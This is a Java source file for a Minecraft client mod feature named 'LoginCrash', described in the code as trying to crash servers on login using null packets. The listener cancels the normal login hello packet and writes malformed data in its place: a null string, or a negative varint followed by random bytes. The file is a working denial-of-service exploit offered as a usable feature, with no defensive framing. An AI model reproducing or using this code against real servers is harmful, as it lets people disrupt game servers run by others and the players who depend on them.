package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.crash.event.EventWriteLoginHelloPacket;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;

import java.util.Random;

public class LoginCrash extends Feature {

    public Property<LoginMode> modeProperty = new Property.PropertyBuilder<LoginMode>(this.getClass())
            .name("Mode")
            .value(LoginMode.NORMAL)
            .build();
    public LoginCrash() {
        super(CrashPlugin.CRASH, "Tries to crash the server on login using null packets. (By 0x150)");
    }

    @EventPointer
    private final EventListener<EventWriteLoginHelloPacket> eventWriteLoginHelloPacketEventListener = new EventListener<>(eventWriteLoginHelloPacket -> {
        toggleState();
        eventWriteLoginHelloPacket.cancel();
        switch (modeProperty.value()) {
            case NORMAL -> eventWriteLoginHelloPacket.getPacketByteBuf().writeString(null);
            case TEST -> {
                byte[] bytes = new byte[256];
                new Random().nextBytes(bytes);
                eventWriteLoginHelloPacket.getPacketByteBuf().writeVarInt(-1);
                eventWriteLoginHelloPacket.getPacketByteBuf().writeBytes(bytes);
            }
        }
    });

    public enum LoginMode {
        NORMAL, TEST
    }
}
